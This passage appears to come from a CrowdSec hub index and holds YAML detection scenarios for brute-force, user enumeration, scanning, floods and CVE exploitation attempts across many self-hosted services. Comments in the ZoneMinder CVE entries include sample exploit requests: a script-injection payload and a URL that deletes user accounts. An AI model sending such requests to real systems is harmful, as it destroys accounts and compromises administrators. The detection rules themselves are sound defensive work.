evt.Meta.log_type == 'dockge_failed_auth'\ngroupby: evt.Meta.source_ip\nleakspeed: 1m\ncapacity: 5\nblackhole: 5m\nlabels:\n  service: dockge\n  classification:\n    - attack.T1110\n  behavior: \"http:bruteforce\"\n  confidence: 3\n  spoofable: 0\n  label: \"Dockge Bruteforce\"\n  remediation: true\n---\n# Dockge User Enumeration\ntype: leaky\nname: LearningSpot/dockge_bf_user_enum\ndescription: \"Detect Dockge User Enumeration Bruteforce\"\nfilter: evt.Meta.log_type == 'dockge_failed_auth'\ndistinct: evt.Meta.username\ngroupby: evt.Meta.source_ip\nleakspeed: 1m\ncapacity: 5\nblackhole: 5m\nlabels:\n  service: dockge\n  classification:\n    - attack.T1589\n    - attack.T1110\n  behavior: \"http:bruteforce\"\n  confidence: 3\n  spoofable: 0\n  label: \"Dockge User Enumeration\"\n  remediation: true\n", "description": "Detect Dockge Bruteforce", "path": "scenarios/LearningSpot/dockge-bf.yaml", "version": "0.3", "versions": {"0.1": {"digest": "ac6c5a04e8302cf5ad7c8ded8075391376fd8846d26a9913b5f7bacd8f4ae3db"}, "0.2": {"digest": "4c4ebaa4360375c28ac9a3a5993be17d28d4e2b3f54a7720fa7601802e42af59"}, "0.3": {"digest": "9137e89fd353428f2c338de7cfcec6a92ff8380183d5c5b98ec70579ee2dbfd0"}}}, "LearningSpot/hestiacp-bf": {"content": "# Hestiacp Bruteforce\ntype: leaky\nname: LearningSpot/hestiacp-bf\ndescription: \"Detect Hestiacp Bruteforce\"\nfilter: evt.Meta.log_type == 'hestiacp_failed_auth'\ngroupby: evt.Meta.source_ip\nleakspeed: 1m\ncapacity: 5\nblackhole: 1m\nlabels:\n  service: hestiacp\n  classification:\n    - attack.T1110\n  behavior: \"http:bruteforce\"\n  confidence: 3\n  spoofable: 0\n  label: \"hestiacp Bruteforce\"\n  remediation: true\n---\n# Hestiacp User Enumeration\ntype: leaky\nname: LearningSpot/hestiacp-bf-user-enum\ndescription: \"Detect Hestiacp User Enumeration Bruteforce\"\nfilter: evt.Meta.log_type == 'hestiacp_failed_auth'\ndistinct: evt.Meta.target_user\ngroupby: evt.Meta.source_ip\nleakspeed: 1m\ncapacity: 5\nblackhole: 1m\nlabels:\n  service: hestiacp\n  classification:\n    - attack.T1589\n    - attack.T1110\n  behavior: \"http:bruteforce\"\n  confidence: 3\n  spoofable: 0\n  label: \"Hestiacp User Enumeration\"\n  remediation: true\n", "description": "Detect Hestiacp Bruteforce", "path": "scenarios/LearningSpot/hestiacp-bf.yaml", "version": "0.1", "versions": {"0.1": {"digest": "2213913506e732274d075a246d2bab6740620c3533391de32f96d944a0d3efc3"}}}, "LearningSpot/litellm-bf": {"content": "# Litellm bruteforce\ntype: leaky\nname: LearningSpot/litellm-bf\ndescription: \"Detect bruteforce attempts to Litellm\"\nfilter: \"evt.Meta.log_type == 'litellm_failed_auth' && evt.Meta.status == '401'\"\ngroupby: evt.Meta.source_ip\nleakspeed: 1m\ncapacity: 5\nblackhole: 1m\nlabels:\n  service: litellm\n  classification:\n    - attack.T1110\n  behavior: \"http:bruteforce\"\n  confidence: 3\n  spoofable: 0\n  label: \"Litellm Bruteforce\"\n  remediation: true\n", "description": "Detect bruteforce attempts to Litellm", "path": "scenarios/LearningSpot/litellm-bf.yaml", "version": "0.1", "versions": {"0.1": {"digest": "7801f9908d78a614ac6259af3636f280673ab502162035f8a9ad3296e8ae19de"}}}, "MariuszKociubinski/bitwarden-bf": {"content": "# bitwarden bruteforce\ntype: leaky\nname: MariuszKociubinski/bitwarden-bf\ndescription: \"Detect bitwarden bruteforce\"\ndebug: false\nfilter:\n  \"evt.Meta.log_type in ['bitwarden_failed_auth','bitwarden_failed_auth_2fa']\"\n  #filter: \"evt.Meta.log_type == 'bitwarden_failed_auth'\"\nleakspeed: \"1m\"\ncapacity: 5\ngroupby: evt.Meta.source_ip\nblackhole: 5m\nreprocess: false\nlabels:\n  service: bitwarden\n  behavior: \"generic:bruteforce\"\n  classification:\n    - attack.T1110\n  label: \"Bitwarden User Enumeration\"\n  spoofable: 0\n  confidence: 3\n  remediation: true\n", "description": "Detect bitwarden bruteforce", "path": "scenarios/MariuszKociubinski/bitwarden-bf.yaml", "version": "0.2", "versions": {"0.1": {"digest": "43e83e367af5eba9d525953587a65905e109057fac7a52e68ce04606a01e8b23"}, "0.2": {"digest": "d68d05489f98eb1194c0935d043f9cd760cadf07fc53308ae640ce7efe250356"}}}, "MrShippeR/filebrowser-bf": {"content": "type: leaky\nname: MrShippeR/filebrowser-bf\ndescription: \"Detect FileBrowser bruteforce login attempts\"\nfilter: evt.Meta.log_type == 'filebrowser_failed_auth'\ngroupby: evt.Meta.source_ip\nleakspeed: 10s\ncapacity: 5\nblackhole: 1m\nlabels:\n  service: filebrowser\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  behavior: \"generic:bruteforce\"\n  label: \"Filebrowser bruteforce\"\n  remediation: true\n", "description": "Detect FileBrowser bruteforce login attempts", "path": "scenarios/MrShippeR/filebrowser-bf.yaml", "version": "0.1", "versions": {"0.1": {"digest": "6ea21cadef1656ce4a2f8e6166e422fe3bda676d768025ba7e6b5a7e62e0e658"}}}, "PintjesB/technitium-bf": {"content": "# Technitium bruteforce\ntype: leaky\nname: PintjesB/technitium-bf\ndescription: \"Detect Technitium bruteforce attacks\"\nfilter: \"evt.Meta.log_type == 'technitium_failed_auth'\"\nleakspeed: 1m\ncapacity: 5\ngroupby: evt.Meta.source_ip\nblackhole: 5m\nreprocess: true\nlabels:\n  service: technitium\n  spoofable: 0\n  confidence: 3\n  classification:\n    - attack.T1110\n  label: \"Technitium bruteforce\"\n  behavior: \"http:bruteforce\"\n  remediation: true\n", "description": "Detect Technitium bruteforce attacks", "path": "scenarios/PintjesB/technitium-bf.yaml", "version": "0.1", "versions": {"0.1": {"digest": "e811f95435bdd4a3277c765dace76c9d231e320d0910389f7fd24eb6e6962f37"}}}, "a1ad/meshcentral-bf": {"content": "# meshcentral BF scan\nname: a1ad/meshcentral-bf\ndescription: \"Detect meshcentral bruteforce\"\nfilter: \"evt.Meta.log_type == 'meshcentral_failed_auth'\"\n#debug: true\ntype: leaky\ngroupby: evt.Meta.source_ip\nleakspeed: \"20s\"\ncapacity: 5\nblackhole: 1m\nlabels:\n  service: meshcentral\n  behavior: \"http:bruteforce\"\n  classification:\n    - attack.T1110\n  spoofable: 0\n  confidence: 3\n  label: \"MeshCentral Bruteforce\"\n  remediation: true\n---\n# meshcentral user-enum\ntype: leaky\nname: a1ad/meshcentral-bf_user-enum\ndescription: \"Detect meshcentral user enum bruteforce\"\nfilter: \"evt.Meta.log_type == 'meshcentral_failed_auth'\"\ngroupby: evt.Meta.source_ip\ndistinct: evt.Meta.user\nleakspeed: 10s\ncapacity: 5\nblackhole: 1m\nlabels:\n  service: meshcentral\n  behavior: \"http:bruteforce\"\n  classification:\n    - attack.T1589\n    - attack.T1110\n  spoofable: 0\n  confidence: 3\n  label: \"MeshCentral User Enumeration\"\n  remediation: true\n", "description": "Detect meshcentral bruteforce", "path": "scenarios/a1ad/meshcentral-bf.yaml", "version": "0.2", "versions": {"0.1": {"digest": "f9c23983ecdee70491e334732b2cb2ba7ef5fb61a5d119951930ba5b7cb93e51"}, "0.2": {"digest": "bfa1db16802b90bf3648ca8f59c75fec48b297b65c30c01608bff71e8ee2e2cf"}}}, "a1ad/mikrotik-bf": {"content": "# Mikrotik BF scan\nname: a1ad/mikrotik-bf\ndescription: \"Detect Mikrotik bruteforce\"\nfilter: \"evt.Meta.log_type == 'mikrotik_failed_auth'\"\n#debug: true\ntype: leaky\ngroupby: evt.Meta.source_ip\nleakspeed: \"20s\"\ncapacity: 5\nblackhole: 1m\nlabels:\n  service: mikrotik\n  behavior: \"iot:bruteforce\"\n  classification:\n    - attack.T1110\n  spoofable: 0\n  confidence: 3\n  label: \"Mikrotik Bruteforce\"\n  remediation: true\n---\n# meshcentral user-enum\ntype: leaky\nname: a1ad/mikrotik-bf_user-enum\ndescription: \"Detect mikrotik user enum bruteforce\"\nfilter: \"evt.Meta.log_type == 'mikrotik_failed_auth'\"\ngroupby: evt.Meta.source_ip\ndistinct: evt.Meta.user\nleakspeed: 10s\ncapacity: 5\nblackhole: 1m\nlabels:\n  service: mikrotik\n  behavior: \"iot:bruteforce\"\n  classification:\n    - attack.T1589\n    - attack.T1110\n  spoofable: 0\n  confidence: 3\n  label: \"Mikrotik User Enumeration\"\n  remediation: true\n", "description": "Detect Mikrotik bruteforce", "path": "scenarios/a1ad/mikrotik-bf.yaml", "version": "0.2", "versions": {"0.1": {"digest": "186b0c6b7fe346e3e3843e90135735ed0195233abd5e5a2a06b3420275ef9e2d"}, "0.2": {"digest": "69a55380db43a066268c70ba1d0a3934e6188b4669337c091d2898b398cdcbad"}}}, "a1ad/mikrotik-scan-multi_ports": {"content": "type: leaky\nname: a1ad/mikrotik-scan-multi_ports\ndescription: \"Detect port scanning from single ip on MikroTik router\"\nfilter: \"evt.Meta.log_type == 'mikrotik_drop' && evt.Meta.service == 'tcp_udp'\"\ngroupby: evt.Meta.source_ip\ndistinct: evt.Parsed.dst_port\ncapacity: 15\nleakspeed: 5s\nblackhole: 1m\nlabels:\n  service: mikrotik\n  behavior: \"tcp:scan\"\n  classification:\n    - attack.T1595.001\n    - attack.T1018\n    - attack.T1046\n  spoofable: 2\n  confidence: 1\n  label: \"MikroTik Port Scanning\"\n  remediation: true\n", "description": "Detect port scanning from single ip on MikroTik router", "path": "scenarios/a1ad/mikrotik-scan-multi_ports.yaml", "version": "0.3", "versions": {"0.1": {"digest": "eb9e82a3f0179f4e407b91e618dc960da0bf7244f018dc2bd5cee181035e1d3a"}, "0.2": {"digest": "aabd6503e4b3f1974760e168872ba557927ede9a5e516777dc49d0c872314fc3"}, "0.3": {"digest": "104b45e980fb6c20041842aaa3e66a1120adb2d17d2e868fb234e953fabf1ac8"}}}, "aidalinfo/couchdb-bf": {"content": "# couchdb slow bruteforce\ntype: leaky\nname: aidalinfo/couchdb-slow-bf\ndescription: \"Detect slow Couchdb bruteforce/enum\"\nfilter: evt.Meta.log_type == 'bf-enum-couchdb'\nleakspeed: \"60s\"\ncapacity: 10\ngroupby: evt.Meta.source_ip\nblackhole: 1m\nreprocess: true\nlabels:\n  service: couchdb\n  remediation: true\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  label: \"Couchdb low Bruteforce\"\n---\n# couchdb bruteforce\ntype: leaky\nname: aidalinfo/couchdb-bf\ndescription: \"Detect Couchdb bruteforce/enum\"\nfilter: evt.Meta.log_type == 'bf-enum-couchdb'\nleakspeed: \"10s\"\ncapacity: 5\ngroupby: evt.Meta.source_ip\nblackhole: 1m\nreprocess: true\nlabels:\n  service: couchdb\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  label: \"Couchdb Bruteforce\"\n  remediation: true", "description": "Detect slow Couchdb bruteforce/enum", "path": "scenarios/aidalinfo/couchdb-bf.yaml", "version": "0.1", "versions": {"0.1": {"digest": "51b01a6b282027299192db588a2e3de5b46fbcfcbe8cba15d419ba010ffcff71"}}}, "aidalinfo/couchdb-crawl": {"content": "type: leaky\nname: aidalinfo/couchdb-crawl\ndescription: \"Detect aggressive crawl on CouchDB\"\nfilter: evt.Meta.log_type == 'crawl-couchdb'\ndistinct: evt.Meta.path_db\nleakspeed: 0.5s\ncapacity: 40\n#debug: true\n#this limits the memory cache (and event_sequences in output) to five events\ncache_size: 5\ngroupby: evt.Meta.source_ip\nblackhole: 1m\nlabels:\n  service: couchdb\n  confidence: 1\n  spoofable: 0\n  classification:\n    - attack.T1595\n  behavior: \"http:crawl\"\n  label: \"CouchDB Crawl\"\n  remediation: true", "description": "Detect aggressive crawl on CouchDB", "path": "scenarios/aidalinfo/couchdb-crawl.yaml", "version": "0.3", "versions": {"0.1": {"digest": "0531619cc321e1dd46b812c5af6edcf8599fbbc7f019e2c56d2dcb94e8ecfae9"}, "0.2": {"digest": "07f46b4913b9b215d552e6276583e1015f43369c9108d46c33a59eee1c112dd2"}, "0.3": {"digest": "7ff0dd0aeb2d5cc508cc69e5fc3ba63e86b3a37c2860f171b7914d728bedf656"}}}, "aidalinfo/tcpudp-flood-traefik": {"content": "type: leaky\nname: aidalinfo/tcpudp-flood-traefik\ndescription: \"Detect TCP/UDP flood\"\nfilter: \"evt.Meta.log_type == 'traefik_tcpudp'\"\ngroupby: \"evt.Meta.source_ip\"\ncapacity: 1000\ncache_size: 10\nleakspeed: \"10s\"\nblackhole: 5m\nlabels:\n  remediation: true\n  classification:\n    - attack.T1498\n  spoofable: 0\n  confidence: 2\n  label: \"UDP or TCP Flood Traefik\"\n", "description": "Detect TCP/UDP flood", "path": "scenarios/aidalinfo/tcpudp-flood-traefik.yaml", "version": "0.1", "versions": {"0.1": {"digest": "279599e76231935a36a5efafb12ddc5ed432f56d8c6c5c93daa277261a680182"}}}, "andreasbrett/baikal-bf": {"content": "# Baikal bruteforce\ntype: leaky\nname: andreasbrett/baikal-bf\ndescription: \"Detect Baikal bruteforce attacks\"\nfilter: \"evt.Meta.log_type in ['baikal_failed_auth', 'baikal_failed_auth_no_user']\"\nleakspeed: 1m\ncapacity: 5\ngroupby: evt.Meta.source_ip\nblackhole: 5m\nreprocess: true\nlabels:\n    service: baikal\n    type: bruteforce\n    classification:\n      - attack.T1110\n    remediation: true\n    behavior: http:bruteforce\n    spoofable: 0\n    confidence: 3\n---\n# Baikal user-enum (only for web UI since Baikal doesn't log failed username for CalDAV/CardDAV access)\ntype: leaky\nname: andreasbrett/baikal-bf_user-enum\ndescription: \"Detect Baikal user enum bruteforce\"\nfilter: \"evt.Meta.log_type == 'baikal_failed_auth'\"\ngroupby: evt.Meta.source_ip\ndistinct: evt.Meta.username\nleakspeed: 1m\ncapacity: 5\nblackhole: 5m\nlabels:\n    service: baikal\n    type: bruteforce\n    remediation: true\n    behavior: http:bruteforce\n    spoofable: 0\n    confidence: 3\n    classification:\n      - attack.T1110", "description": "Detect Baikal bruteforce attacks", "path": "scenarios/andreasbrett/baikal-bf.yaml", "version": "0.5", "versions": {"0.1": {"digest": "6e560fc2a7297c34acf8b4a1310d99f8aaaafa8c3d72698cd3812d3d5a2c73d6"}, "0.2": {"digest": "5a05fcd4f832c12defc47cb1bb2e214ee686305e8d7d643ad25969a661cb2c4f"}, "0.3": {"digest": "a0cdfd365b1ac0406e4a66317e7e0924826cd5f1be41ec906597cc56f4591c0f"}, "0.4": {"digest": "dba7a79d5cb51283c1da9c5d12570895a6cac01326109ee332bada785a7308b8"}, "0.5": {"digest": "5a05fcd4f832c12defc47cb1bb2e214ee686305e8d7d643ad25969a661cb2c4f"}}}, "andreasbrett/paperless-ngx-bf": {"content": "# Paperless-ngx bruteforce\ntype: leaky\nname: andreasbrett/paperless-ngx-bf\ndescription: \"Detect Paperless-ngx bruteforce attacks\"\nfilter: \"evt.Meta.log_type == 'paperless_ngx_failed_auth'\"\nleakspeed: 1m\ncapacity: 5\ngroupby: evt.Meta.source_ip\nblackhole: 5m\nreprocess: true\nlabels:\n    service: paperless-ngx\n    confidence: 3\n    spoofable: 0\n    classification:\n        - attack.T1110\n    label: \"Paperless-ngx Bruteforce\"\n    behavior: \"http:bruteforce\"\n    remediation: true\n---\n# Paperless-ngx user-enum\ntype: leaky\nname: andreasbrett/paperless-ngx-bf_user-enum\ndescription: \"Detect Paperless-ngx user enum bruteforce\"\nfilter: \"evt.Meta.log_type == 'paperless_ngx_failed_auth'\"\ngroupby: evt.Meta.source_ip\ndistinct: evt.Meta.username\nleakspeed: 1m\ncapacity: 5\nblackhole: 5m\nlabels:\n    service: paperless-ngx\n    confidence: 3\n    spoofable: 0\n    classification:\n        - attack.T1589\n    label: \"Paperless-ngx User Enumeration\"\n    behavior: \"http:bruteforce\"\n    remediation: true\n", "description": "Detect Paperless-ngx bruteforce attacks", "path": "scenarios/andreasbrett/paperless-ngx-bf.yaml", "version": "0.3", "versions": {"0.1": {"digest": "cbfdde07a106b2e72769f381490da31062b4789f4f1a5e35a6a168dca2354d74"}, "0.2": {"digest": "8f8c1e1a4554e30febf77fdce884ddeec79df20eb20ee5d33a563024acd3e013"}, "0.3": {"digest": "db6ad37ca94b4d5390573129a9b86fa68068391ce216aa326f07b3a4c23d718f"}}}, "andreasbrett/webmin-bf": {"content": "# Webmin bruteforce\ntype: leaky\nname: andreasbrett/webmin-bf\ndescription: \"Detect Webmin bruteforce attacks\"\nfilter: \"evt.Meta.log_type == 'webmin_failed_auth_wrong_pass'\"\nleakspeed: 1m\ncapacity: 5\ngroupby: evt.Meta.source_ip\nblackhole: 5m\nreprocess: true\nlabels:\n    service: webmin\n    confidence: 3\n    spoofable: 0\n    classification:\n        - attack.T1110\n    label: \"Webmin Bruteforce\"\n    behavior: \"http:bruteforce\"\n    remediation: true\n---\n# Webmin user-enum\ntype: leaky\nname: andreasbrett/webmin-bf_user-enum\ndescription: \"Detect Webmin user enum bruteforce\"\nfilter: \"evt.Meta.log_type == 'webmin_failed_auth_wrong_pass'\"\ngroupby: evt.Meta.source_ip\ndistinct: evt.Meta.username\nleakspeed: 1m\ncapacity: 5\nblackhole: 5m\nlabels:\n    service: webmin\n    confidence: 3\n    spoofable: 0\n    classification:\n        - attack.T1589\n    label: \"Webmin Bruteforce\"\n    behavior: \"http:bruteforce\"\n    remediation: true\n", "description": "Detect Webmin bruteforce attacks", "path": "scenarios/andreasbrett/webmin-bf.yaml", "version": "0.2", "versions": {"0.1": {"digest": "565ea4cf8ba6add8648fac488c904e2283afe76fe5b41e9f6bddf29a92b50b7c"}, "0.2": {"digest": "0fa97ae9e9f79be63615dc34a6695cfe5c88a6f7d8d29ef28305593422ff58da"}}}, "barnoux/crs-anomaly-score": {"content": "type: trigger\nname: barnoux/crs-anomaly-score\ndescription: \"Web exploitation detected via Core Rule Set inbound anomaly scoring set by the user in crs-setup.conf\"\nfilter: evt.Meta.log_type == 'modsecurity' && evt.Parsed.ruleid == '949110'\ngroupby: evt.Meta.source_ip\nblackhole: 2m\nlabels:\n  remediation: true\n  classification:\n    - attack.T1595\n    - attack.T1190\n  behavior: \"http:exploit\"\n  label: \"CRS Anomaly Alert\"\n  spoofable: 0\n  confidence: 2\n  service: http\n", "description": "Web exploitation detected via Core Rule Set inbound anomaly scoring set by the user in crs-setup.conf", "path": "scenarios/barnoux/crs-anomaly-score.yaml", "version": "0.1", "versions": {"0.1": {"digest": "78b59c3ad3c60f29395b241a773eea440c53dd0e7fab0938619f7031b0e05214"}}}, "baudneo/gotify-bf": {"content": "type: leaky\nname: baudneo/gotify-bf\ndescription: \"Detect bruteforce\"\nfilter: \"evt.Meta.log_type  == 'gotify_failed_auth'\"\ngroupby: \"evt.Meta.source_ip\"\ncapacity: 3\nleakspeed: \"10s\"\nblackhole: 1m\nlabels:\n  service: gotify\n  behavior: \"http:bruteforce\"\n  classification:\n    - attack.T1110\n  spoofable: 0\n  confidence: 3\n  label: \"Gotify Bruteforce\"\n  remediation: true\n", "description": "Detect bruteforce", "path": "scenarios/baudneo/gotify-bf.yaml", "version": "0.3", "versions": {"0.1": {"digest": "584f3cea147a6aca903f87b63d43bade9da0449c23b90efb26de9fa798d06fdb"}, "0.2": {"digest": "d6ed2ccf69900783b22537eac017528704b37de1872db95e1424689ef1b45554"}, "0.3": {"digest": "860c5265a1d19e76550a022a8be9a200e0163a7b6c1d19968846ffac999c2aa6"}}}, "baudneo/zoneminder-bf": {"content": "# loging bruteforce\ntype: leaky\nname: baudneo/zoneminder-bf\ndescription: \"Detect ZoneMinder bruteforce\"\nfilter: \"evt.Meta.log_subtype == 'zm_bad_password'\"\ngroupby: \"evt.Meta.source_ip\"\ncapacity: 4\nleakspeed: \"10s\"\nblackhole: 1m\nlabels:\n  service: zoneminder\n  type: bruteforce\n  spoofable: 0\n  confidence: 3\n  remediation: true\n  classification:\n    - attack.T1110\n  behavior: \"http:bruteforce\"\n  label: \"Zoneminder bruteforce\"\n---\n# user enum\ntype: leaky\nname: baudneo/zoneminder-bf\ndescription: \"Detect ZoneMinder user enumeration\"\nfilter: \"evt.Meta.log_subtype == 'zm_bad_user'\"\ngroupby: \"evt.Meta.source_ip\"\ndistinct: \"evt.Meta.username\"\ncapacity: 4\nleakspeed: \"10s\"\nblackhole: 1m\nlabels:\n  service: zoneminder\n  type: bruteforce\n  spoofable: 0\n  confidence: 3\n  remediation: true\n  classification:\n    - attack.T1589\n    - attack.T1110\n  behavior: \"http:bruteforce\"\n  label: \"Zoneminder user enumeration\"\n", "description": "Detect ZoneMinder bruteforce", "path": "scenarios/baudneo/zoneminder-bf.yaml", "version": "0.2", "versions": {"0.1": {"digest": "23f8a840d8341ffad8f70b787e7dc5c9ecbab0c3bcc91eaada7dffdc2a4613f7"}, "0.2": {"digest": "ba9fd1bb90d61bec138d023c07418c93e8cd5a0e030ab7e67e14c66443e7fb89"}}}, "baudneo/zoneminder_cve-2022-39285": {"content": "type: trigger\nformat: 2.0\n#debug: true\n#  file=http%3A%2F%2F10.0.10.107%2Fzm%2F&lt;/td&gt;&lt;/tr&gt;&lt;script src='/zm/?view=options%26tab=users%26action=delete%26markUids%5B%5D=6%26deleteBtn=Delete'&lt;/script&gt;&line=70\nname: baudneo/zoneminder_cve-2022-39285\ndescription: \"Detect cve-2022-39285 exploitation attempts\"\nfilter: |\n  evt.Meta.log_type in [\"http_access-log\", \"http_error-log\"]\n  and \n    (\n      ( Upper(evt.Meta.http_verb) == \"POST\" and\n          Upper(evt.Meta.http_path) matches Upper('^(?P<path>/.*index.php)?.*(?P<file_query>file=.*&lt;/td&gt;&lt;/tr(?P<payload>.*)&gt;)')\n      )\n      or \n      Upper(evt.Parsed.rawrequest) matches Upper('^(?P<verb>POST) (?P<path>/.*index.php)?.*(?P<file_query>file=.*&lt;/td&gt;&lt;/tr(?P<payload>.*)&gt;)')\n    )\ngroupby: \"evt.Meta.source_ip\"\nblackhole: 2m\nlabels:\n  remediation: true\n  classification:\n    - attack.T1595\n    - attack.T1190\n    - cve.CVE-2022-39285\n  spoofable: 0\n  confidence: 3\n  service: zoneminder\n  behavior: \"http:exploit\"\n  label: \"Zoneminder CVE-2022-39285\"\n", "description": "Detect cve-2022-39285 exploitation attempts", "path": "scenarios/baudneo/zoneminder_cve-2022-39285.yaml", "version": "0.2", "versions": {"0.1": {"digest": "ce8c950d3c51b1e3b1aa7f3b77d29e080a59b5cba2151057c4651a124b752216"}, "0.2": {"digest": "be09593bd2cf6c92f04b76d31958c4882e9d1a173594175868b348f7b0e1a016"}}}, "baudneo/zoneminder_cve-2022-39290": {"content": "type: trigger\nformat: 2.0\n#debug: true\n#/zm/index.php?view=options&tab=users&action=delete&markUids%5B%5D=13&deleteBtn=Delete\nname: baudneo/zoneminder_cve-2022-39290\ndescription: \"Detect cve-2022-39290 exploitation attempts\"\nfilter: |\n  evt.Meta.log_type in [\"http_access-log\", \"http_error-log\"]\n  and Upper(evt.Meta.http_verb) == \"GET\"\n  and  Upper(evt.Meta.http_path) matches Upper('.*action=.*')\ngroupby: \"evt.Meta.source_ip\"\nblackhole: 2m\nlabels:\n  classification:\n    - attack.T1595\n    - attack.T1190\n    - cve.CVE-2022-39290\n  spoofable: 0\n  confidence: 3\n  service: zoneminder\n  behavior: \"http:exploit\"\n  label: \"Zoneminder CVE-2022-39290\"\n  remediation: true\n", "description": "Detect cve-2022-39290 exploitation attempts", "path": "scenarios/baudneo/zoneminder_cve-2022-39290.yaml", "version": "0.2", "versions": {"0.1": {"digest": "b0ea4c6323f2a29c66ce3ec6bcb34ee0721ff6de66c37cd50f3bc9e0179febb1"}, "0.2": {"digest": "9780563700326839396f67fffb58787680bc32cd363d5e609953ba328eb42890"}}}, "baudneo/zoneminder_cve-2022-39291": {"content": "type: leaky\nformat: 2.0\n#debug: true\n#  __csrf_magic=key%3A85866fbcb6a1d7325544a55aa63fb534677f34ca%2C1665102411&request=log&task=create&level=ERR&message=Trenches%20of%20IT%20PoC&browser%5Bname%5D=Chrome&browser%5Bversion%5D=101.0.4951.41&browser%5Bplatform%5D=Windows&file=line=800&view=request HTTP/1.1\nname: baudneo/zoneminder_cve-2022-39291\ndescription: \"Detect cve-2022-39291 exploitation attempts\"\nfilter: |\n  evt.Meta.log_type in [\"http_access-log\", \"http_error-log\"]\n  and \n  (\n  ( Upper(evt.Meta.http_verb) == \"POST\" and\n  Upper(evt.Meta.http_path) matches Upper('^(?P<path>/.*index.php)?.*(?P<view>view=request|request=log|task=create)+.*(?P<request_query>view=request|request=log|task=create)+.*(?P<task_query>view=request|request=log|task=create)+.*')\n\n  )\n  or\n  Upper(evt.Parsed.rawrequest) matches Upper('^(?P<verb>POST) (?P<path>/.*index.php)?.*(?P<view>view=request|request=log|task=create)+.*(?P<request_query>view=request|request=log|task=create)+.*(?P<task_query>view=request|request=log|task=create)+.*')\n  )\ngroupby: \"evt.Meta.source_ip\"\ncapacity: 10\nleakspeed: \"10s\"\nblackhole: 2m\nlabels:\n  classification:\n    - attack.T1595\n    - attack.T1190\n    - cve.CVE-2022-39291\n  spoofable: 0\n  confidence: 3\n  service: zoneminder\n  behavior: \"http:exploit\"\n  label: \"Zoneminder CVE-2022-39291\"\n  remediation: true\n", "description": "Detect cve-2022-39291 exploitation attempts", "path": "scenarios/baudneo/zoneminder_cve-2022-39291.yaml", "version": "0.2", "versions": {"0.1": {"digest": "8374d8580cd1d1c2c56e2c7e12ba82b3e1f797d0b300fb6d620825b77f61a6c5"}, "0.2": {"digest": "d0f2d1eca926874288de1c8443a813ebb24f0ed0a26d869c23e441666de52c73"}}}, "bouddha-fr/opensearch-dashboard-bf": {"content": "# OpenSearch web auth bruteforce\ntype: leaky\nname: bouddha-fr/opensearch-dashboard-bf\ndescription: \"Detect bruteforce attempts on OpenSearch web interface\"\nfilter: evt.Meta.log_type == 'opensearch_failed_auth'\nleakspeed: \"10s\"\ncapacity: 5\ngroupby: evt.Meta.source_ip\nblackhole: 5m\nlabels:\n  remediation: true\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  behavior: \"http:bruteforce\"\n  label: \"OpenSearch Bruteforce\"\n  service: opensearch\n", "description": "Detect bruteforce attempts on OpenSearch web interface", "path": "scenarios/bouddha-fr/opensearch-dashboard-bf.yaml", "version": "0.1", "versions": {"0.1": {"digest": "0936ebe07aa200051aa3c4525c6913fb9e5aa9748aa5ffaf96e0787b56d7d883"}}}, "corvese/apache-guacamole_bf": {"content": "type: leaky\nname: corvese/apache-guacamole_bf\ndescription: \"Detect Apache Guacamole user bruteforce\"\nfilter: evt.Meta.log_type == 'apache-guacamole_failed_auth'\ngroupby: evt.Meta.source_ip\nleakspeed: 10s\ncapacity: 5\nblackhole: 1m\nlabels:\n  service: apache-guacamole\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  behavior: \"http:bruteforce\"\n  label: \"Apache Guacamole Bruteforce\"\n  remediation: true\n", "description": "Detect Apache Guacamole user bruteforce", "path": "scenarios/corvese/apache-guacamole_bf.yaml", "version": "0.2", "versions": {"0.1": {"digest": "78920b8234b82abaeb1b73c6f3994f4c35e5c90cab074a7f11d9ffb58248ef70"}, "0.2": {"digest": "f6cf4a711993f42488873b936d5fe591043c1d3c15e62b42794f31fde0b52682"}}}, "corvese/apache-guacamole_user_enum": {"content": "type: leaky\nname: corvese/apache-guacamole_user_enum\ndescription: \"Detect Apache Guacamole user enum bruteforce\"\nfilter: evt.Meta.log_type == 'apache-guacamole_failed_auth'\ngroupby: evt.Meta.source_ip\ndistinct: evt.Meta.target_user\nleakspeed: 10s\ncapacity: 5\nblackhole: 1m\nlabels:\n  service: apache-guacamole\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1589\n    - attack.T1110\n  behavior: \"http:bruteforce\"\n  label: \"Apache Guacamole User Enumeration\"\n  remediation: true\n", "description": "Detect Apache Guacamole user enum bruteforce", "path": "scenarios/corvese/apache-guacamole_user_enum.yaml", "version": "0.2", "versions": {"0.1": {"digest": "9657710b2f728d779870ceda5d46c624dd1e33415c51232293f0ba416beda965"}, "0.2": {"digest": "2782dcc3e78f4679f66b6b186b050e016010dc225f3a3fc0a3ff3f73d92e1690"}}}, "crowdsecurity/CVE-2017-9841": {"content": "type: trigger\n#debug: true\nname: crowdsecurity/CVE-2017-9841\ndescription: \"Detect CVE-2017-9841 exploits\"\nfilter: |\n    evt.Meta.log_type == 'http_access-log' &&\n    Lower(evt.Meta.http_path) endsWith 'util/php/eval-stdin.php'\nblackhole: 1m\ngroupby: \"evt.Meta.source_ip\"\nlabels:\n  type: exploit\n  remediation: true\n  classification:\n    - attack.T1595\n    - attack.T1190\n    - cve.CVE-2017-9841\n  spoofable: 0\n  confidence: 3\n  behavior: \"http:exploit\"\n  label: \"PHP Unit Test Framework CVE-2017-9841\"\n  service: PHP\n", "description": "Detect CVE-2017-9841 exploits", "path": "scenarios/crowdsecurity/CVE-2017-9841.yaml", "version": "0.2", "versions": {"0.1": {"digest": "6fc6487fc9c9e60d99dccdd37b063c9f52c53d4ebed28d8d83aa69b6b29cfca3"}, "0.2": {"digest": "a9421e42d85c3f1aab40ef09aaa0261db42f34c5d95986d6a67c9db8b577889e"}}}, "crowdsecurity/CVE-2019-18935": {"content": "type: trigger\nformat: 2.0\nname: crowdsecurity/CVE-2019-18935\ndescription: \"Detect Telerik CVE-2019-18935 exploitation attempts\"\nfilter: |\n  evt.Meta.log_type in ['http_access-log', 'http_error-log'] && Upper(QueryUnescape(evt.Meta.http_path)) startsWith Upper('/Telerik.Web.UI.WebResource.axd?type=rau')\ngroupby: \"evt.Meta.source_ip\"\nblackhole: 2m\nlabels:\n  type: exploit\n  